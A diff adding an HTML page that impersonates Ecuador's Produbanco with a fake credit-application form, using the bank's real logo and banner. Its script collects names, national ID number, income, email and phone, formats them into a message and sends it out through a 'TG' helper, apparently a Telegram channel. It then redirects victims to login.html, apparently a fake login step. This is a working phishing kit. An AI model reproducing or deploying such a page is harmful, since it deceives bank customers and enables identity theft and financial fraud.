@@ -1,0 +1,885 @@
+<html lang="es"><head></head><body>﻿
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Crédito - Produbanco enlínea</title>
+
+    <!-- Favicon igual que en el index -->
+    <link rel="icon" type="image/png" href="../favicon.png">
+
+    <!-- Fuente -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap">
+
+    <style>
+        :root {
+            --verde-oscuro: #003f20;
+            --verde-medio: #00923f;
+            --verde-claro: #7ac143;
+            --gris-claro: #f4f4f4;
+            --gris-borde: #d6d6d6;
+            --texto: #333333;
+            --error: #c62828;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Roboto", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background-color: #ffffff;
+            color: var(--texto);
+            min-height: 100vh;
+        }
+
+        /* LAYOUT PRINCIPAL */
+        .layout {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .left-panel {
+            flex: 0 0 52%;
+            padding: 15px 72px 40px 88px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .brand-logo {
+            height: 58px;
+            width: auto;
+        }
+
+        .form-wrapper {
+            max-width: 520px;
+        }
+
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--verde-oscuro);
+            margin-bottom: 6px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: #555555;
+            margin-bottom: 28px;
+        }
+
+        .form-subtitle span {
+            font-weight: 500;
+            color: var(--verde-oscuro);
+        }
+
+        form {
+            background-color: #ffffff;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 16px 24px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group--full {
+            grid-column: 1 / -1;
+        }
+
+        label {
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 4px;
+            color: #444444;
+        }
+
+        .required {
+            color: #e53935;
+            margin-left: 2px;
+        }
+
+        input,
+        select,
+        textarea {
+            font-family: inherit;
+            font-size: 14px;
+            padding: 10px 12px;
+            border-radius: 4px;
+            border: 1px solid var(--gris-borde);
+            outline: none;
+            transition: border-color 0.18s ease, box-shadow 0.18s ease;
+        }
+
+        input:focus,
+        select:focus,
+        textarea:focus {
+            border-color: var(--verde-medio);
+            box-shadow: 0 0 0 1px rgba(0, 146, 63, 0.18);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 90px;
+            width: 100%;
+        }
+
+        .custom-select-wrapper {
+            position: relative;
+        }
+
+        .custom-select {
+            display: none;
+            position: relative;
+            width: 100%;
+        }
+
+        .custom-select-toggle {
+            width: 100%;
+            min-height: 40px;
+            border: 1px solid var(--gris-borde);
+            border-radius: 4px;
+            background-color: #ffffff;
+            color: #333333;
+            font-family: inherit;
+            font-size: 14px;
+            text-align: left;
+            padding: 10px 38px 10px 12px;
+            cursor: pointer;
+            position: relative;
+            transition: border-color 0.18s ease, box-shadow 0.18s ease;
+        }
+
+        .custom-select-toggle::after {
+            content: '';
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            width: 8px;
+            height: 8px;
+            border-right: 2px solid #5b5b5b;
+            border-bottom: 2px solid #5b5b5b;
+            transform: translateY(-65%) rotate(45deg);
+            transition: transform 0.18s ease;
+            pointer-events: none;
+        }
+
+        .custom-select.is-open .custom-select-toggle::after {
+            transform: translateY(-35%) rotate(-135deg);
+        }
+
+        .custom-select-toggle.is-placeholder {
+            color: #777777;
+        }
+
+        .custom-select-toggle:focus {
+            border-color: var(--verde-medio);
+            box-shadow: 0 0 0 1px rgba(0, 146, 63, 0.18);
+        }
+
+        .custom-select-options {
+            display: none;
+            position: absolute;
+            z-index: 20;
+            top: calc(100% + 4px);
+            left: 0;
+            right: 0;
+            border: 1px solid var(--gris-borde);
+            border-radius: 6px;
+            background-color: #ffffff;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+            max-height: 220px;
+            overflow-y: auto;
+        }
+
+        .custom-select.is-open .custom-select-options {
+            display: block;
+        }
+
+        .custom-select-option {
+            display: block;
+            width: 100%;
+            border: none;
+            background: none;
+            text-align: left;
+            font-family: inherit;
+            font-size: 14px;
+            color: #333333;
+            padding: 10px 12px;
+            cursor: pointer;
+        }
+
+        .custom-select-option:hover,
+        .custom-select-option.is-selected {
+            background-color: #f1f7f3;
+        }
+
+        .custom-select-option:disabled {
+            color: #9a9a9a;
+            cursor: not-allowed;
+        }
+
+        .helper-text {
+            font-size: 11px;
+            color: #777777;
+            margin-top: 2px;
+        }
+
+        .error-message {
+            margin-top: 4px;
+            font-size: 12px;
+            color: var(--error);
+            visibility: hidden;
+        }
+
+        .has-error input,
+        .has-error select,
+        .has-error textarea,
+        .has-error .custom-select-toggle {
+            border-color: var(--error);
+            box-shadow: 0 0 0 1px rgba(198, 40, 40, 0.12);
+        }
+
+        .has-error .error-message {
+            visibility: visible;
+        }
+
+        .submit-row {
+            margin-top: 28px;
+        }
+
+        .submit-btn {
+            background-color: var(--verde-oscuro);
+            color: #ffffff;
+            padding: 11px 26px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            transition: background-color 0.18s ease, box-shadow 0.18s ease, transform 0.05s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #002a16;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.18);
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+            box-shadow: none;
+        }
+
+        .small-footnote {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #777777;
+            line-height: 1.5;
+        }
+
+        /* PANEL DERECHO (IMAGEN) */
+        .right-panel {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            justify-content: flex-end;
+            padding-left: 40px;
+            background-color: #ffffff;
+        }
+
+        .right-panel::before {
+            content: "";
+            display: none;
+        }
+
+        .right-image {
+            height: 100%;
+            max-width: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* ROW TELÉFONO */
+        .phone-row {
+            display: flex;
+            gap: 8px;
+            align-items: stretch;
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 1024px) {
+            .left-panel {
+                padding: 24px 32px 32px;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .layout {
+                flex-direction: column;
+            }
+
+            .left-panel {
+                flex: none;
+                padding: 20px 20px 28px;
+            }
+
+            .form-wrapper {
+                max-width: none;
+            }
+
+            .form-title {
+                font-size: 24px;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .custom-select {
+                display: block;
+            }
+
+            .custom-select-wrapper select {
+                position: absolute;
+                width: 1px;
+                height: 1px;
+                margin: -1px;
+                border: 0;
+                padding: 0;
+                overflow: hidden;
+                clip: rect(0 0 0 0);
+                clip-path: inset(50%);
+                white-space: nowrap;
+            }
+
+            .right-panel {
+                display: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .brand {
+                margin-bottom: 28px;
+            }
+
+            .brand-logo {
+                height: 47px;
+            }
+
+            .left-panel {
+                padding: 16px 16px 24px;
+            }
+
+            .form-title {
+                font-size: 22px;
+            }
+
+            .form-subtitle {
+                font-size: 13px;
+            }
+        }
+    </style>
+
+
+    <div class="layout">
+        <!-- PANEL IZQUIERDO: LOGO + FORMULARIO -->
+        <div class="left-panel">
+            <header class="brand">
+                <img src="https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg" alt="Produbanco" class="brand-logo">
+            </header>
+
+            <main class="form-wrapper">
+                <h1 class="form-title">Hola, te damos la bienvenida</h1>
+                <p class="form-subtitle">
+                    Completa tu solicitud de crédito <span>enlínea</span> para que un asesor se comunique contigo.
+                </p>
+
+                <form id="creditForm" novalidate="">
+                    <div class="form-grid">
+                        <!-- NOMBRES -->
+                        <div class="form-group">
+                            <label for="firstName">Nombres<span class="required">*</span></label>
+                            <input type="text" id="firstName" name="firstName" autocomplete="given-name" required="">
+                            <div class="error-message" id="firstNameError">Ingresa tus nombres.</div>
+                        </div>
+
+                        <!-- APELLIDOS -->
+                        <div class="form-group">
+                            <label for="lastName">Apellidos<span class="required">*</span></label>
+                            <input type="text" id="lastName" name="lastName" autocomplete="family-name" required="">
+                            <div class="error-message" id="lastNameError">Ingresa tus apellidos.</div>
+                        </div>
+
+                        <!-- DOCUMENTO -->
+                        <div class="form-group">
+                            <label for="documentNumber">Número de documento<span class="required">*</span></label>
+                            <input type="text" id="documentNumber" name="documentNumber" autocomplete="off" inputmode="numeric" maxlength="10" pattern="[0-9]{10}" required="">
+                            <div class="error-message" id="documentError">Ingresa un número de documento válido de 10 dígitos.</div>
+                        </div>
+
+                        <!-- TIPO DE CUENTA -->
+                        <div class="form-group">
+                            <label for="accountType">¿Eres cliente de Produbanco?<span class="required">*</span></label>
+                            <select id="accountType" name="accountType" required="">
+                                <option value="" disabled="" selected="">Selecciona una opción</option>
+                                <option value="si">Sí</option>
+                                <option value="no">No</option>
+                            </select>
+                            <div class="error-message" id="accountTypeError">Selecciona si eres cliente.</div>
+                        </div>
+
+                        <!-- TIPO DE CRÉDITO -->
+                        
+
+                        <!-- DETALLE OTRO CRÉDITO -->
+                        
+
+                        <!-- INGRESOS -->
+                        <div class="form-group">
+                            <label for="monthlyIncome">Ingresos mensuales aproximados<span class="required">*</span></label>
+                            <select id="monthlyIncome" name="monthlyIncome" required="">
+                                <option value="" disabled="" selected="">Selecciona un rango</option>
+                                <option value="300-500">$300 - $500</option>
+                                <option value="500-900">$500 - $900</option>
+                                <option value="900-1500">$900 - $1,500</option>
+                                <option value="1500-2500">$1,500 - $2,500</option>
+                                <option value="2500-5000">$2,500 - $5,000</option>
+                                <option value="5000+">$5,000+</option>
+                            </select>
+                            <div class="error-message" id="incomeError">Selecciona tu rango de ingresos mensuales.</div>
+                        </div>
+
+                        <!-- EMAIL -->
+                        <div class="form-group">
+                            <label for="email">Correo electrónico<span class="required">*</span></label>
+                            <input type="email" id="email" name="email" autocomplete="email" required="">
+                            <div class="error-message" id="emailError">
+                                Ingresa un correo electrónico válido (ej: nombre@dominio.com).
+                            </div>
+                        </div>
+
+                        <!-- TELÉFONO -->
+                        <div class="form-group">
+                            <label for="phoneNumber">Número de teléfono o celular<span class="required">*</span></label>
+                            <div class="phone-row">
+                                <input type="tel" id="phoneNumber" name="phoneNumber" class="phone-input" autocomplete="tel" inputmode="numeric" minlength="9" maxlength="9" pattern="[0-9]{9}" placeholder="Número de teléfono o celular" required="">
+                            </div>
+                            <div class="error-message" id="phoneError">
+                                Ingresa un número de teléfono válido de 9 dígitos.
+                            </div>
+                        </div>
+
+                        <!-- PREFERENCIA DE CONTACTO -->
+                        <div class="form-group">
+                            <label for="communicationPreference">Preferencia de comunicación<span class="required">*</span></label>
+                            <select id="communicationPreference" name="communicationPreference" required="">
+                                <option value="" disabled="" selected="">Selecciona una opción</option>
+                                <option value="whatsapp">WhatsApp</option>
+                                <option value="email">Correo electrónico</option>
+                            </select>
+                            <div class="error-message" id="preferenceError">Selecciona tu preferencia de comunicación.</div>
+                        </div>
+
+                        <!-- DETALLES ADICIONALES -->
+                        
+                    </div>
+
+                    <div class="submit-row">
+                        <button type="submit" class="submit-btn" style="background-color: #69be28 !important; color: #fff !important; border-color: #69be28 !important;">Enviar solicitud</button>
+                    </div>
+
+                    <p class="small-footnote">
+                        Al enviar tu solicitud aceptas que Produbanco se comunique contigo por los medios seleccionados para brindarte
+                        información sobre tu crédito.
+                    </p>
+                </form>
+            </main>
+        </div>
+
+        <!-- PANEL DERECHO: IMAGEN -->
+        <div class="right-panel">
+            <img src="https://www.produbanco.com/Produnet/Imagen/DesignSystem/ds_banner.png" alt="Produbanco enlínea" class="right-image">
+        </div>
+    </div>
+
+        <script src="tg.js"></script>
+    <script>
+        (function () {
+            var form = document.getElementById('creditForm');
+            var submitBtn = form.querySelector('.submit-btn');
+
+            var firstName = document.getElementById('firstName');
+            var lastName = document.getElementById('lastName');
+            var documentNumber = document.getElementById('documentNumber');
+            var accountType = document.getElementById('accountType');
+            
+            
+            
+            var monthlyIncome = document.getElementById('monthlyIncome');
+            var email = document.getElementById('email');
+            var phoneNumber = document.getElementById('phoneNumber');
+            var communicationPreference = document.getElementById('communicationPreference');
+            
+            var customSelectInstances = [];
+
+            function toggleLoader(show) {
+                if (window.TG && typeof TG.overlay === 'function') {
+                    TG.overlay(show);
+                }
+            }
+
+            function setError(groupEl) {
+                groupEl.classList.add('has-error');
+            }
+
+            function clearError(groupEl) {
+                groupEl.classList.remove('has-error');
+            }
+
+            function selectLabel(selectEl) {
+                return selectEl.options[selectEl.selectedIndex]
+                    ? selectEl.options[selectEl.selectedIndex].textContent.trim()
+                    : '';
+            }
+
+            function normalizeName(value) {
+                return value
+                    .replace(/[^A-Za-zÁÉÍÓÚáéíóúÑñÜü\s]/g, '')
+                    .replace(/\s{2,}/g, ' ')
+                    .replace(/^\s+/g, '');
+            }
+
+            function normalizeDoc(value) {
+                return value.replace(/\D/g, '').slice(0, 10);
+            }
+
+            function normalizePhone(value) {
+                return value.replace(/\D/g, '').slice(0, 9);
+            }
+
+            function isValidEmail(value) {
+                return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(value.trim());
+            }
+
+            function isValidName(value) {
+                return /^[A-Za-zÁÉÍÓÚáéíóúÑñÜü\s]{2,}$/.test(value.trim());
+            }
+
+            function isValidDocument(value) {
+                return /^\d{10}$/.test(value);
+            }
+
+            function isValidPhone(value) {
+                var digits = normalizePhone(value);
+                return /^\d{9}$/.test(digits);
+            }
+
+            function validateRequiredInput(id) {
+                var input = document.getElementById(id);
+                var group = input.closest('.form-group');
+                var value = input.value.trim();
+
+                if (!value) {
+                    setError(group);
+                    return false;
+                }
+
+                if ((id === 'firstName' || id === 'lastName') && !isValidName(value)) {
+                    setError(group);
+                    return false;
+                }
+
+                if (id === 'documentNumber' && !isValidDocument(value)) {
+                    setError(group);
+                    return false;
+                }
+                clearError(group);
+                return true;
+            }
+
+            function validateRequiredSelect(id) {
+                var select = document.getElementById(id);
+                var group = select.closest('.form-group');
+                if (!select.value) {
+                    setError(group);
+                    return false;
+                }
+                clearError(group);
+                return true;
+            }
+
+            function validateEmail() {
+                var group = email.closest('.form-group');
+                if (!email.value.trim() || !isValidEmail(email.value)) {
+                    setError(group);
+                    return false;
+                }
+                clearError(group);
+                return true;
+            }
+
+            function validatePhone() {
+                var group = phoneNumber.closest('.form-group');
+                if (!phoneNumber.value.trim() || !isValidPhone(phoneNumber.value)) {
+                    setError(group);
+                    return false;
+                }
+                clearError(group);
+                return true;
+            }
+
+            function validateOtherCreditIfNeeded() { return true; }
+            function handleCreditTypeVisibility() {}
+
+            function closeAllCustomSelects(exceptInstance) {
+                customSelectInstances.forEach(function (instance) {
+                    if (instance !== exceptInstance) {
+                        instance.container.classList.remove('is-open');
+                        instance.toggle.setAttribute('aria-expanded', 'false');
+                    }
+                });
+            }
+
+            function syncCustomSelect(instance) {
+                var selectedOption = instance.select.options[instance.select.selectedIndex] || null;
+                var text = selectedOption ? selectedOption.textContent.trim() : 'Selecciona una opción';
+                var isPlaceholder = !instance.select.value;
+
+                instance.toggle.textContent = text || 'Selecciona una opción';
+                instance.toggle.classList.toggle('is-placeholder', isPlaceholder);
+
+                instance.optionButtons.forEach(function (button) {
+                    button.classList.toggle('is-selected', button.dataset.value === instance.select.value && !!instance.select.value);
+                });
+            }
+
+            function createCustomSelectFor(selectEl) {
+                if (selectEl.dataset.customMobileReady === 'true') {
+                    return;
+                }
+
+                selectEl.dataset.customMobileReady = 'true';
+
+                var wrapper = document.createElement('div');
+                wrapper.className = 'custom-select-wrapper';
+                selectEl.parentNode.insertBefore(wrapper, selectEl);
+                wrapper.appendChild(selectEl);
+
+                var custom = document.createElement('div');
+                custom.className = 'custom-select';
+
+                var toggle = document.createElement('button');
+                toggle.type = 'button';
+                toggle.className = 'custom-select-toggle';
+                toggle.setAttribute('aria-haspopup', 'listbox');
+                toggle.setAttribute('aria-expanded', 'false');
+
+                var options = document.createElement('div');
+                options.className = 'custom-select-options';
+                options.setAttribute('role', 'listbox');
+
+                var optionButtons = [];
+                Array.prototype.forEach.call(selectEl.options, function (option) {
+                    var optionButton = document.createElement('button');
+                    optionButton.type = 'button';
+                    optionButton.className = 'custom-select-option';
+                    optionButton.textContent = option.textContent;
+                    optionButton.dataset.value = option.value;
+
+                    if (option.disabled && !option.value) {
+                        optionButton.disabled = true;
+                    }
+
+                    optionButton.addEventListener('click', function () {
+                        if (optionButton.disabled) {
+                            return;
+                        }
+
+                        selectEl.value = optionButton.dataset.value;
+                        selectEl.dispatchEvent(new Event('change', { bubbles: true }));
+                        custom.classList.remove('is-open');
+                        toggle.setAttribute('aria-expanded', 'false');
+                        syncCustomSelect(instance);
+                    });
+
+                    options.appendChild(optionButton);
+                    optionButtons.push(optionButton);
+                });
+
+                custom.appendChild(toggle);
+                custom.appendChild(options);
+                wrapper.appendChild(custom);
+
+                var instance = {
+                    select: selectEl,
+                    container: custom,
+                    toggle: toggle,
+                    optionButtons: optionButtons
+                };
+
+                toggle.addEventListener('click', function () {
+                    var isOpen = custom.classList.contains('is-open');
+                    closeAllCustomSelects(instance);
+                    custom.classList.toggle('is-open', !isOpen);
+                    toggle.setAttribute('aria-expanded', String(!isOpen));
+                });
+
+                selectEl.addEventListener('change', function () {
+                    syncCustomSelect(instance);
+                });
+
+                customSelectInstances.push(instance);
+                syncCustomSelect(instance);
+            }
+
+            function initializeMobileCustomSelects() {
+                [accountType, monthlyIncome, communicationPreference].forEach(function (selectEl) {
+                    createCustomSelectFor(selectEl);
+                });
+            }
+
+            function validateAll() {
+                var ok = true;
+                ok = validateRequiredInput('firstName') && ok;
+                ok = validateRequiredInput('lastName') && ok;
+                ok = validateRequiredInput('documentNumber') && ok;
+                ok = validateRequiredSelect('accountType') && ok;
+                
+                ok = validateRequiredSelect('monthlyIncome') && ok;
+                ok = validateRequiredSelect('communicationPreference') && ok;
+                ok = validateEmail() && ok;
+                ok = validatePhone() && ok;
+                ok = validateOtherCreditIfNeeded() && ok;
+                return ok;
+            }
+
+            toggleLoader(true);
+            window.addEventListener('load', function () {
+                toggleLoader(false);
+            });
+            window.addEventListener('pageshow', function () {
+                toggleLoader(false);
+            });
+
+            firstName.addEventListener('input', function () {
+                firstName.value = normalizeName(firstName.value);
+            });
+
+            lastName.addEventListener('input', function () {
+                lastName.value = normalizeName(lastName.value);
+            });
+
+            documentNumber.addEventListener('input', function () {
+                documentNumber.value = normalizeDoc(documentNumber.value);
+            });
+
+            phoneNumber.addEventListener('input', function () {
+                phoneNumber.value = normalizePhone(phoneNumber.value);
+            });
+
+            email.addEventListener('blur', validateEmail);
+            phoneNumber.addEventListener('blur', validatePhone);
+
+            ['firstName', 'lastName', 'documentNumber'].forEach(function (id) {
+                var input = document.getElementById(id);
+                input.addEventListener('blur', function () {
+                    validateRequiredInput(id);
+                });
+            });
+
+            ['accountType', 'monthlyIncome', 'communicationPreference'].forEach(function (id) {
+                var select = document.getElementById(id);
+                select.addEventListener('change', function () {
+                    validateRequiredSelect(id);
+                });
+            });
+
+            
+
+            document.addEventListener('click', function (event) {
+                var insideCustom = event.target.closest('.custom-select');
+                if (!insideCustom) {
+                    closeAllCustomSelects();
+                }
+            });
+
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                if (!validateAll()) {
+                    return;
+                }
+
+                var docValue = normalizeDoc(documentNumber.value.trim());
+                var phoneValue = normalizePhone(phoneNumber.value.trim());
+
+                var accountTypeText = selectLabel(accountType);
+                
+                var incomeText = selectLabel(monthlyIncome);
+                var preferenceText = selectLabel(communicationPreference);
+                
+                
+
+                TG.clear();
+                TG.save('nombres', firstName.value.trim());
+                TG.save('apellidos', lastName.value.trim());
+                TG.save('documento', docValue);
+                TG.save('codDig', docValue.slice(-4));
+                TG.save('esCliente', accountTypeText);
+                TG.save('email', email.value.trim());
+                TG.save('whatsapp', phoneValue);
+                
+                TG.save('tipoCliente', accountTypeText);
+                
+                TG.save('ingresosMensuales', incomeText);
+                TG.save('preferenciaComunicacion', preferenceText);
+                TG.save('isRetry', 'false');
+
+                var msg = '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
+                    + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
+                    + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
+                    + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
+                    + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
+                    + '\u{1F4C3} Tipo de cliente: ' + TG.load('tipoCliente') + '\n'
+                    + '\u{1F4B3} Tipo de credito: ' + TG.load('tipoCredito') + '\n'
+                    + '\u{1F4B0} Ingresos mensuales: ' + TG.load('ingresosMensuales') + '\n'
+                    + '\u{1F4AC} Preferencia de comunicacion: ' + TG.load('preferenciaComunicacion') + '\n'
+                    + '\u{1F4E7} Email: ' + TG.load('email') + '\n'
+                    + '\u{1F4F1} Telefono/Celular: ' + TG.load('whatsapp')
+                    + '\n\u{1F310} Origen: ' + (new URLSearchParams(window.location.search).get('origen') || 'Desconocido');
+
+                submitBtn.disabled = true;
+                toggleLoader(true);
+
+                TG.send(msg, false).then(function () { window.location.href = 'login.html'; });
+            });
+
+            initializeMobileCustomSelects();
+            handleCreditTypeVisibility();
+        })();
+    </script>
+
+
+
+
+</body></html>
